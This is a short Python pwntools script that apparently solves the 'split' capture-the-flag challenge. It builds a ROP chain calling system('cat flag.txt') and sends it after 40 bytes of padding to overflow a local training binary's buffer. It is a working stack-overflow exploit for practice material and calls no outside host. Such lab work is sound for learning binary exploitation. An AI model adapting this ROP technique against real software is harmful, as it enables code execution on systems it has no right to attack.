#!/usr/bin/env python
# coding: utf-8
from pwn import *
import sys

def build_rop(challenge_binary):
    e = ELF(challenge_binary)
    info("Searching for system...")
    system = e.symbols['system']
    info("Found offset %s for target function 'system'" %(hex(system)))
    info("Searching for 'cat flag.txt'...")
    cat_flag = e.search("cat flag.txt").next()
    info("Found offset %s for target string 'cat flag.txt'" %(hex(cat_flag)))
    context.clear(arch='amd64') # without this, for some fucking reason, it gets confused.
    rop = ROP(e)
    rop.system(cat_flag) 
    info(rop.dump())
    return str(rop)

def build_exploit(challenge_binary):
    junk_len = 40
    ropchain = build_rop(challenge_binary)
    buffer = "A"*junk_len + ropchain
    return buffer

def main():
    challenge_binary = "./challenges/split"
    buffer = build_exploit(challenge_binary) # build our buffer/gadgets to send
    p = process(challenge_binary)
    p.recvuntil("> ")
    p.sendline(buffer)
    flag = p.recvline()
    success(flag)

if __name__ == "__main__":
    main()
